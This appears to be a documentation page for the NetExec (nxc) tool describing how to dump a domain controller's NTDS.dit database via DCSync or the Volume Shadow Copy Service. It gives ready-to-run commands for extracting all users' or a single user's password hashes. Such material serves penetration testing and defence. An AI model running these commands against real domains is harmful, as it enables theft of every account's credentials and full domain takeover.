# Dump NTDS.dit

### Dump the NTDS.dit from target DC using methods from secretsdump.py

{% hint style="danger" %}
Requires Domain Admin or Local Admin Priviledges on target Domain Controller
{% endhint %}

```bash
2 methods are available:   
(default) 	drsuapi -  Uses drsuapi RPC interface create a handle, trigger replication, and combined with   
						additional drsuapi calls to convert the resultant linked-lists into readable format  
			vss - Uses the Volume Shadow copy Service  
```

### Dump all users from the NTDS.dit

```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --enabled
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds vss
```

{% hint style="info" %}
You can also DCSYNC with the computer account of the DC
{% endhint %}

### Dump a specific user only

```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' --ntds --user Administrator
```

{% hint style="warning" %}
In environments with multiple domains (e.g., parent/child), make sure to specify the full NetBIOS format when using --user, such as: **--user NETBIOS/Administrator**. This avoids ambiguity when the same username exists in different domains.
{% endhint %}

There is also the ntdsutil module that will use ntdsutil to dump NTDS.dit and SYSTEM hive and parse them locally with secretsdump.py&#x20;

```bash
nxc smb 192.168.1.100 -u UserName -p 'PASSWORDHERE' -M ntdsutil
```

